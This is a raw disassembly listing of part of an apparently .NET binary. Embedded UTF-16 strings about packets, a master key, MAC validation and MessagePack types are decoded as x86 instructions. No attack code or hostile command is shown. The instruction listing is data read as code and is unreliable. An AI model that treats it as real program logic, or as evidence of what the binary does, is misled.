  40bc43:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc47:	61                   	popa
  40bc48:	00 63 00             	add    %ah,0x0(%ebx)
  40bc4b:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc4e:	11 52 00             	adc    %edx,0x0(%edx)
  40bc51:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc55:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc59:	76 00                	jbe    0x40bc5b
  40bc5b:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc60:	0b 45 00             	or     0x0(%ebp),%eax
  40bc63:	72 00                	jb     0x40bc65
  40bc65:	72 00                	jb     0x40bc67
  40bc67:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc68:	00 72 00             	add    %dh,0x0(%edx)
  40bc6b:	00 47 6d             	add    %al,0x6d(%edi)
  40bc6e:	00 61 00             	add    %ah,0x0(%ecx)
  40bc71:	73 00                	jae    0x40bc73
  40bc73:	74 00                	je     0x40bc75
  40bc75:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc79:	4b                   	dec    %ebx
  40bc7a:	00 65 00             	add    %ah,0x0(%ebp)
  40bc7d:	79 00                	jns    0x40bc7f
  40bc7f:	20 00                	and    %al,(%eax)
  40bc81:	63 00                	arpl   %eax,(%eax)
  40bc83:	61                   	popa
  40bc84:	00 6e 00             	add    %ch,0x0(%esi)
  40bc87:	20 00                	and    %al,(%eax)
  40bc89:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc8a:	00 6f 00             	add    %ch,0x0(%edi)
  40bc8d:	74 00                	je     0x40bc8f
  40bc8f:	20 00                	and    %al,(%eax)
  40bc91:	62 00                	bound  %eax,(%eax)
  40bc93:	65 00 20             	add    %ah,%gs:(%eax)
  40bc96:	00 6e 00             	add    %ch,0x0(%esi)
  40bc99:	75 00                	jne    0x40bc9b
  40bc9b:	6c                   	insb   (%dx),%es:(%edi)
  40bc9c:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bca0:	00 6f 00             	add    %ch,0x0(%edi)
  40bca3:	72 00                	jb     0x40bca5
  40bca5:	20 00                	and    %al,(%eax)
  40bca7:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bcab:	70 00                	jo     0x40bcad
  40bcad:	74 00                	je     0x40bcaf
  40bcaf:	79 00                	jns    0x40bcb1
  40bcb1:	2e 00 00             	add    %al,%cs:(%eax)
  40bcb4:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bcb9:	70 00                	jo     0x40bcbb
  40bcbb:	75 00                	jne    0x40bcbd
  40bcbd:	74 00                	je     0x40bcbf
  40bcbf:	20 00                	and    %al,(%eax)
  40bcc1:	63 00                	arpl   %eax,(%eax)
  40bcc3:	61                   	popa
  40bcc4:	00 6e 00             	add    %ch,0x0(%esi)
  40bcc7:	20 00                	and    %al,(%eax)
  40bcc9:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcca:	00 6f 00             	add    %ch,0x0(%edi)
  40bccd:	74 00                	je     0x40bccf
  40bccf:	20 00                	and    %al,(%eax)
  40bcd1:	62 00                	bound  %eax,(%eax)
  40bcd3:	65 00 20             	add    %ah,%gs:(%eax)
  40bcd6:	00 6e 00             	add    %ch,0x0(%esi)
  40bcd9:	75 00                	jne    0x40bcdb
  40bcdb:	6c                   	insb   (%dx),%es:(%edi)
  40bcdc:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bce0:	00 00                	add    %al,(%eax)
  40bce2:	55                   	push   %ebp
  40bce3:	49                   	dec    %ecx
  40bce4:	00 6e 00             	add    %ch,0x0(%esi)
  40bce7:	76 00                	jbe    0x40bce9
  40bce9:	61                   	popa
  40bcea:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bcee:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bcf2:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcf5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bcf9:	73 00                	jae    0x40bcfb
  40bcfb:	61                   	popa
  40bcfc:	00 67 00             	add    %ah,0x0(%edi)
  40bcff:	65 00 20             	add    %ah,%gs:(%eax)
  40bd02:	00 61 00             	add    %ah,0x0(%ecx)
  40bd05:	75 00                	jne    0x40bd07
  40bd07:	74 00                	je     0x40bd09
  40bd09:	68 00 65 00 6e       	push   $0x6e006500
  40bd0e:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd12:	00 63 00             	add    %ah,0x0(%ebx)
  40bd15:	61                   	popa
  40bd16:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd1a:	00 6f 00             	add    %ch,0x0(%edi)
  40bd1d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd1e:	00 20                	add    %ah,(%eax)
  40bd20:	00 63 00             	add    %ah,0x0(%ebx)
  40bd23:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd24:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bd28:	00 20                	add    %ah,(%eax)
  40bd2a:	00 28                	add    %ch,(%eax)
  40bd2c:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd2f:	41                   	inc    %ecx
  40bd30:	00 43 00             	add    %al,0x0(%ebx)
  40bd33:	29 00                	sub    %eax,(%eax)
  40bd35:	2e 00 00             	add    %al,%cs:(%eax)
  40bd38:	05 58 00 32 00       	add    $0x320058,%eax
  40bd3d:	00 0f                	add    %cl,(%edi)
  40bd3f:	7b 00                	jnp    0x40bd41
  40bd41:	30 00                	xor    %al,(%eax)
  40bd43:	3a 00                	cmp    (%eax),%al
  40bd45:	44                   	inc    %esp
  40bd46:	00 33                	add    %dh,(%ebx)
  40bd48:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd4b:	20 00                	and    %al,(%eax)
  40bd4d:	00 0f                	add    %cl,(%edi)
  40bd4f:	7b 00                	jnp    0x40bd51
  40bd51:	30 00                	xor    %al,(%eax)
  40bd53:	3a 00                	cmp    (%eax),%al
  40bd55:	58                   	pop    %eax
  40bd56:	00 32                	add    %dh,(%edx)
  40bd58:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd5b:	20 00                	and    %al,(%eax)
  40bd5d:	00 2b                	add    %ch,(%ebx)
  40bd5f:	28 00                	sub    %al,(%eax)
  40bd61:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd62:	00 65 00             	add    %ah,0x0(%ebp)
  40bd65:	76 00                	jbe    0x40bd67
  40bd67:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd6b:	20 00                	and    %al,(%eax)
  40bd6d:	75 00                	jne    0x40bd6f
  40bd6f:	73 00                	jae    0x40bd71
  40bd71:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd76:	00 20                	add    %ah,(%eax)
  40bd78:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd7c:	00 70 00             	add    %dh,0x0(%eax)
  40bd7f:	65 00 20             	add    %ah,%gs:(%eax)
  40bd82:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd85:	63 00                	arpl   %eax,(%eax)
  40bd87:	31 00                	xor    %eax,(%eax)
  40bd89:	00 45 28             	add    %al,0x28(%ebp)
  40bd8c:	00 65 00             	add    %ah,0x0(%ebp)
  40bd8f:	78 00                	js     0x40bd91
  40bd91:	74 00                	je     0x40bd93
  40bd93:	38 00                	cmp    %al,(%eax)
  40bd95:	2c 00                	sub    $0x0,%al
  40bd97:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd9b:	74 00                	je     0x40bd9d
  40bd9d:	31 00                	xor    %eax,(%eax)
  40bd9f:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bda3:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bda7:	33 00                	xor    (%eax),%eax
  40bda9:	32 00                	xor    (%eax),%al
  40bdab:	29 00                	sub    %eax,(%eax)
  40bdad:	20 00                	and    %al,(%eax)
  40bdaf:	74 00                	je     0x40bdb1
  40bdb1:	79 00                	jns    0x40bdb3
  40bdb3:	70 00                	jo     0x40bdb5
  40bdb5:	65 00 20             	add    %ah,%gs:(%eax)
  40bdb8:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bdbb:	63 00                	arpl   %eax,(%eax)
  40bdbd:	37                   	aaa
  40bdbe:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bdc1:	24 00                	and    $0x0,%al
  40bdc3:	63 00                	arpl   %eax,(%eax)
  40bdc5:	38 00                	cmp    %al,(%eax)
  40bdc7:	2c 00                	sub    $0x0,%al
  40bdc9:	24 00                	and    $0x0,%al
  40bdcb:	63 00                	arpl   %eax,(%eax)
  40bdcd:	39 00                	cmp    %eax,(%eax)
  40bdcf:	00 14 74             	add    %dl,(%esp,%esi,2)
  40bdd2:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40bdd6:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40bdd9:	24 f5                	and    $0xf5,%al
  40bddb:	ac                   	lods   %ds:(%esi),%al
  40bddc:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40bde3:	7a 5c                	jp     0x40be41
  40bde5:	56                   	push   %esi
  40bde6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bde9:	89 03                	mov    %eax,(%ebx)
  40bdeb:	00 00                	add    %al,(%eax)
  40bded:	01 03                	add    %eax,(%ebx)
  40bdef:	20 00                	and    %al,(%eax)
  40bdf1:	01 02                	add    %eax,(%edx)
  40bdf3:	06                   	push   %es
  40bdf4:	0e                   	push   %cs
  40bdf5:	03 06                	add    (%esi),%eax
  40bdf7:	12 09                	adc    (%ecx),%cl
  40bdf9:	03 06                	add    (%esi),%eax
  40bdfb:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bdff:	00 02                	add    %al,(%edx)
  40be01:	03 06                	add    (%esi),%eax
  40be03:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40be09:	03 06                	add    (%esi),%eax
  40be0b:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40be10:	03 06                	add    (%esi),%eax
  40be12:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40be18:	06                   	push   %es
  40be19:	1c 02                	sbb    $0x2,%al
  40be1b:	06                   	push   %es
  40be1c:	08 04 00             	or     %al,(%eax,%eax,1)
  40be1f:	00 12                	add    %dl,(%edx)
  40be21:	0d 05 00 01 01       	or     $0x1010005,%eax
  40be26:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be2c:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be32:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be35:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be3b:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be41:	0a 04 00             	or     (%eax,%eax,1),%al
  40be44:	01 01                	add    %eax,(%ecx)
  40be46:	0a 04 00             	or     (%eax,%eax,1),%al
  40be49:	00 12                	add    %dl,(%edx)
  40be4b:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be50:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be56:	02 03                	add    (%ebx),%al
  40be58:	00 00                	add    %al,(%eax)
  40be5a:	1c 03                	sbb    $0x3,%al
  40be5c:	00 00                	add    %al,(%eax)
  40be5e:	08 04 00             	or     %al,(%eax,%eax,1)
  40be61:	01 01                	add    %eax,(%ecx)
  40be63:	08 04 00             	or     %al,(%eax,%eax,1)
  40be66:	01 02                	add    %eax,(%edx)
  40be68:	0e                   	push   %cs
  40be69:	0a 00                	or     (%eax),%al
  40be6b:	04 02                	add    $0x2,%al
  40be6d:	1c 12                	sbb    $0x12,%al
  40be6f:	19 12                	sbb    %edx,(%edx)
  40be71:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be76:	01 01                	add    %eax,(%ecx)
  40be78:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be7e:	1c 04                	sbb    $0x4,%al
  40be80:	08 00                	or     %al,(%eax)
  40be82:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be88:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be8b:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be91:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be94:	00 12                	add    %dl,(%edx)
  40be96:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be9b:	03 08                	add    (%eax),%ecx
  40be9d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bea0:	08 00                	or     %al,(%eax)
  40bea2:	08 03                	or     %al,(%ebx)
  40bea4:	00 00                	add    %al,(%eax)
  40bea6:	0e                   	push   %cs
  40bea7:	04 00                	add    $0x0,%al
  40bea9:	01 0e                	add    %ecx,(%esi)
  40beab:	0e                   	push   %cs
  40beac:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40beb2:	d5 0a                	aad    $0xa
  40beb4:	3a 06                	cmp    (%esi),%al
  40beb6:	00 01                	add    %al,(%ecx)
  40beb8:	12 29                	adc    (%ecx),%ch
  40beba:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40bec0:	03 00                	add    (%eax),%eax
  40bec2:	00 18                	add    %bl,(%eax)
  40bec4:	07                   	pop    %es
  40bec5:	00 03                	add    %al,(%ebx)
  40bec7:	08 18                	or     %bl,(%eax)
  40bec9:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40becf:	18 0e                	sbb    %cl,(%esi)
  40bed1:	06                   	push   %es
  40bed2:	00 02                	add    %al,(%edx)
  40bed4:	02 18                	add    (%eax),%bl
  40bed6:	10 02                	adc    %al,(%edx)
  40bed8:	06                   	push   %es
  40bed9:	00 01                	add    %al,(%ecx)
  40bedb:	11 30                	adc    %esi,(%eax)
  40bedd:	11 30                	adc    %esi,(%eax)
  40bedf:	06                   	push   %es
  40bee0:	00 03                	add    %al,(%ebx)
  40bee2:	01 09                	add    %ecx,(%ecx)
  40bee4:	09 09                	or     %ecx,(%ecx)
  40bee6:	02 06                	add    (%esi),%al
  40bee8:	09 03                	or     %eax,(%ebx)
  40beea:	06                   	push   %es
  40beeb:	11 30                	adc    %esi,(%eax)
  40beed:	04 00                	add    $0x0,%al
  40beef:	00 00                	add    %al,(%eax)
  40bef1:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bef5:	00 00                	add    %al,(%eax)
  40bef7:	04 01                	add    $0x1,%al
  40bef9:	00 00                	add    %al,(%eax)
  40befb:	00 06                	add    %al,(%esi)
  40befd:	00 02                	add    %al,(%edx)
  40beff:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bf02:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bf07:	0e                   	push   %cs
  40bf08:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf0d:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40bf12:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf17:	60                   	pusha
  40bf18:	05 00 01 01 12       	add    $0x12010100,%eax
  40bf1d:	60                   	pusha
  40bf1e:	04 00                	add    $0x0,%al
  40bf20:	01 01                	add    %eax,(%ecx)
  40bf22:	0e                   	push   %cs
  40bf23:	18 06                	sbb    %al,(%esi)
  40bf25:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bf2a:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf2d:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf30:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf36:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf3b:	0e                   	push   %cs
  40bf3c:	04 20                	add    $0x20,%al
  40bf3e:	00 00                	add    %al,(%eax)
  40bf40:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf43:	00 00                	add    %al,(%eax)
  40bf45:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf48:	00 00                	add    %al,(%eax)
  40bf4a:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf4d:	01 01                	add    %eax,(%ecx)
  40bf4f:	0e                   	push   %cs
  40bf50:	04 20                	add    $0x20,%al
  40bf52:	01 0e                	add    %ecx,(%esi)
  40bf54:	0e                   	push   %cs
  40bf55:	06                   	push   %es
  40bf56:	20 01                	and    %al,(%ecx)
  40bf58:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf5d:	20 02                	and    %al,(%edx)
  40bf5f:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf65:	00 01                	add    %al,(%ecx)
  40bf67:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf6c:	06                   	push   %es
  40bf6d:	11 50 03             	adc    %edx,0x3(%eax)
  40bf70:	06                   	push   %es
  40bf71:	12 55 05             	adc    0x5(%ebp),%dl
  40bf74:	00 01                	add    %al,(%ecx)
  40bf76:	0e                   	push   %cs
  40bf77:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf7c:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf81:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf87:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf8d:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf93:	01 01                	add    %eax,(%ecx)
  40bf95:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf9a:	60                   	pusha
  40bf9b:	03 20                	add    (%eax),%esp
  40bf9d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bfa0:	20 00                	and    %al,(%eax)
  40bfa2:	02 03                	add    (%ebx),%al
  40bfa4:	28 00                	sub    %al,(%eax)
  40bfa6:	1c 03                	sbb    $0x3,%al
  40bfa8:	06                   	push   %es
  40bfa9:	12 60 0b             	adc    0xb(%eax),%ah
  40bfac:	20 02                	and    %al,(%edx)
  40bfae:	01 12                	add    %edx,(%edx)
  40bfb0:	60                   	pusha
  40bfb1:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bfb6:	60                   	pusha
  40bfb7:	04 20                	add    $0x20,%al
  40bfb9:	00 12                	add    %dl,(%edx)
  40bfbb:	60                   	pusha
  40bfbc:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfc1:	0e                   	push   %cs
  40bfc2:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfc7:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bfcd:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bfd2:	60                   	pusha
  40bfd3:	08 03                	or     %al,(%ebx)
  40bfd5:	20 00                	and    %al,(%eax)
  40bfd7:	08 05 28 01 12 60    	or     %al,0x60120128
  40bfdd:	08 03                	or     %al,(%ebx)
  40bfdf:	28 00                	sub    %al,(%eax)
  40bfe1:	08 03                	or     %al,(%ebx)
  40bfe3:	06                   	push   %es
  40bfe4:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bfe8:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bfec:	01 08                	add    %ecx,(%eax)
  40bfee:	0e                   	push   %cs
  40bfef:	05 20 01 01 12       	add    $0x12010120,%eax
  40bff4:	61                   	popa
  40bff5:	04 20                	add    $0x20,%al
  40bff7:	01 01                	add    %eax,(%ecx)
  40bff9:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bffc:	01 01                	add    %eax,(%ecx)
  40bffe:	0b 03                	or     (%ebx),%eax
  40c000:	20 00                	and    %al,(%eax)
  40c002:	0b 03                	or     (%ebx),%eax
  40c004:	20 00                	and    %al,(%eax)
  40c006:	0a 03                	or     (%ebx),%al
  40c008:	20 00                	and    %al,(%eax)
  40c00a:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c00f:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c014:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c019:	01 0e                	add    %ecx,(%esi)
  40c01b:	0e                   	push   %cs
  40c01c:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c021:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c024:	01 02                	add    %eax,(%edx)
  40c026:	0e                   	push   %cs
  40c027:	03 20                	add    (%eax),%esp
  40c029:	00 0e                	add    %cl,(%esi)
  40c02b:	04 20                	add    $0x20,%al
  40c02d:	01 01                	add    %eax,(%ecx)
  40c02f:	02 04 20             	add    (%eax,%eiz,1),%al
  40c032:	01 01                	add    %eax,(%ecx)
  40c034:	0c 04                	or     $0x4,%al
  40c036:	20 01                	and    %al,(%ecx)
  40c038:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c03e:	5c                   	pop    %esp
  40c03f:	04 20                	add    $0x20,%al
  40c041:	00 11                	add    %dl,(%ecx)
  40c043:	64 04 20             	fs add $0x20,%al
  40c046:	00 12                	add    %dl,(%edx)
  40c048:	59                   	pop    %ecx
  40c049:	03 28                	add    (%eax),%ebp
  40c04b:	00 0e                	add    %cl,(%esi)
  40c04d:	03 28                	add    (%eax),%ebp
  40c04f:	00 0a                	add    %cl,(%edx)
  40c051:	03 28                	add    (%eax),%ebp
  40c053:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c059:	5c                   	pop    %esp
  40c05a:	04 28                	add    $0x28,%al
  40c05c:	00 11                	add    %dl,(%ecx)
  40c05e:	64 04 00             	fs add $0x0,%al
  40c061:	00 00                	add    %al,(%eax)
  40c063:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c066:	00 00                	add    %al,(%eax)
  40c068:	00 04 04             	add    %al,(%esp,%eax,1)
  40c06b:	00 00                	add    %al,(%eax)
  40c06d:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c074:	06                   	push   %es
  40c075:	00 00                	add    %al,(%eax)
  40c077:	00 04 07             	add    %al,(%edi,%eax,1)
  40c07a:	00 00                	add    %al,(%eax)
  40c07c:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c07f:	00 00                	add    %al,(%eax)
  40c081:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c084:	00 00                	add    %al,(%eax)
  40c086:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c089:	00 00                	add    %al,(%eax)
  40c08b:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c08e:	00 00                	add    %al,(%eax)
  40c090:	00 06                	add    %al,(%esi)
  40c092:	00 02                	add    %al,(%edx)
  40c094:	0e                   	push   %cs
  40c095:	12 61 08             	adc    0x8(%ecx),%ah
  40c098:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c09d:	61                   	popa
  40c09e:	06                   	push   %es
  40c09f:	00 02                	add    %al,(%edx)
  40c0a1:	0e                   	push   %cs
  40c0a2:	05 12 61 05 00       	add    $0x56112,%eax
  40c0a7:	01 01                	add    %eax,(%ecx)
  40c0a9:	12 61 06             	adc    0x6(%ecx),%ah
  40c0ac:	00 02                	add    %al,(%edx)
  40c0ae:	01 12                	add    %edx,(%edx)
  40c0b0:	61                   	popa
  40c0b1:	0e                   	push   %cs
  40c0b2:	07                   	pop    %es
  40c0b3:	00 02                	add    %al,(%edx)
  40c0b5:	01 12                	add    %edx,(%edx)
  40c0b7:	61                   	popa
  40c0b8:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c0bd:	01 12                	add    %edx,(%edx)
  40c0bf:	61                   	popa
  40c0c0:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c0c5:	12 61 0c             	adc    0xc(%ecx),%ah
  40c0c8:	06                   	push   %es
  40c0c9:	00 02                	add    %al,(%edx)
  40c0cb:	01 12                	add    %edx,(%edx)
  40c0cd:	61                   	popa
  40c0ce:	02 06                	add    (%esi),%al
  40c0d0:	00 02                	add    %al,(%edx)
  40c0d2:	01 12                	add    %edx,(%edx)
  40c0d4:	61                   	popa
  40c0d5:	0b 06                	or     (%esi),%eax
  40c0d7:	00 02                	add    %al,(%edx)
  40c0d9:	01 12                	add    %edx,(%edx)
  40c0db:	61                   	popa
  40c0dc:	0a 03                	or     (%ebx),%al
  40c0de:	06                   	push   %es
  40c0df:	11 78 04             	adc    %edi,0x4(%eax)
  40c0e2:	20 01                	and    %al,(%ecx)
  40c0e4:	01 08                	add    %ecx,(%eax)
  40c0e6:	08 01                	or     %al,(%ecx)
  40c0e8:	00 08                	add    %cl,(%eax)
  40c0ea:	00 00                	add    %al,(%eax)
  40c0ec:	00 00                	add    %al,(%eax)
  40c0ee:	00 1e                	add    %bl,(%esi)
  40c0f0:	01 00                	add    %eax,(%eax)
  40c0f2:	01 00                	add    %eax,(%eax)
  40c0f4:	54                   	push   %esp
  40c0f5:	02 16                	add    (%esi),%dl
  40c0f7:	57                   	push   %edi
  40c0f8:	72 61                	jb     0x40c15b
  40c0fa:	70 4e                	jo     0x40c14a
  40c0fc:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0fe:	45                   	inc    %ebp
  40c0ff:	78 63                	js     0x40c164
  40c101:	65 70 74             	gs jo  0x40c178
  40c104:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c10b:	77 73                	ja     0x40c180
  40c10d:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c113:	71 08                	jno    0x40c11d
  40c115:	01 00                	add    %eax,(%eax)
  40c117:	02 00                	add    (%eax),%al
  40c119:	00 00                	add    %al,(%eax)
  40c11b:	00 00                	add    %al,(%eax)
  40c11d:	05 01 00 00 00       	add    $0x1,%eax
  40c122:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c125:	00 07                	add    %al,(%edi)
  40c127:	31 2e                	xor    %ebp,(%esi)
  40c129:	30 2e                	xor    %ch,(%esi)
  40c12b:	30 2e                	xor    %ch,(%esi)
  40c12d:	30 00                	xor    %al,(%eax)
  40c12f:	00 65 01             	add    %ah,0x1(%ebp)
  40c132:	00 29                	add    %ch,(%ecx)
  40c134:	2e 4e                	cs dec %esi
  40c136:	45                   	inc    %ebp
  40c137:	54                   	push   %esp
  40c138:	46                   	inc    %esi
  40c139:	72 61                	jb     0x40c19c
  40c13b:	6d                   	insl   (%dx),%es:(%edi)
  40c13c:	65 77 6f             	gs ja  0x40c1ae
  40c13f:	72 6b                	jb     0x40c1ac
  40c141:	2c 56                	sub    $0x56,%al
  40c143:	65 72 73             	gs jb  0x40c1b9
  40c146:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c14d:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c150:	72 6f                	jb     0x40c1c1
  40c152:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c159:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c160:	0e                   	push   %cs
  40c161:	14 46                	adc    $0x46,%al
  40c163:	72 61                	jb     0x40c1c6
  40c165:	6d                   	insl   (%dx),%es:(%edi)
  40c166:	65 77 6f             	gs ja  0x40c1d8
  40c169:	72 6b                	jb     0x40c1d6
  40c16b:	44                   	inc    %esp
  40c16c:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c173:	61                   	popa
  40c174:	6d                   	insl   (%dx),%es:(%edi)
  40c175:	65 1f                	gs pop %ds
  40c177:	2e 4e                	cs dec %esi
  40c179:	45                   	inc    %ebp
  40c17a:	54                   	push   %esp
  40c17b:	20 46 72             	and    %al,0x72(%esi)
  40c17e:	61                   	popa
  40c17f:	6d                   	insl   (%dx),%es:(%edi)
  40c180:	65 77 6f             	gs ja  0x40c1f2
  40c183:	72 6b                	jb     0x40c1f0
  40c185:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c188:	43                   	inc    %ebx
  40c189:	6c                   	insb   (%dx),%es:(%edi)
  40c18a:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c191:	6f                   	outsl  %ds:(%esi),(%dx)
  40c192:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c199:	04 49                	add    $0x49,%al
  40c19b:	74 65                	je     0x40c202
  40c19d:	6d                   	insl   (%dx),%es:(%edi)
  40c19e:	00 00                	add    %al,(%eax)
  40c1a0:	03 07                	add    (%edi),%eax
  40c1a2:	01 08                	add    %ecx,(%eax)
  40c1a4:	04 00                	add    $0x0,%al
  40c1a6:	01 08                	add    %ecx,(%eax)
  40c1a8:	0e                   	push   %cs
  40c1a9:	03 07                	add    (%edi),%eax
  40c1ab:	01 02                	add    %eax,(%edx)
  40c1ad:	05 00 00 12 80       	add    $0x80120000,%eax
  40c1b2:	b1 05                	mov    $0x5,%cl
  40c1b4:	20 01                	and    %al,(%ecx)
  40c1b6:	0e                   	push   %cs
  40c1b7:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c1bc:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c1c2:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c1c8:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c1cd:	03 02                	add    (%edx),%eax
  40c1cf:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c1d4:	14 07                	adc    $0x7,%al
  40c1d6:	08 0e                	or     %cl,(%esi)
  40c1d8:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c1de:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c1e4:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c1ea:	20 03                	and    %al,(%ebx)
  40c1ec:	01 11                	add    %edx,(%ecx)
  40c1ee:	80 d5 11             	adc    $0x11,%ch
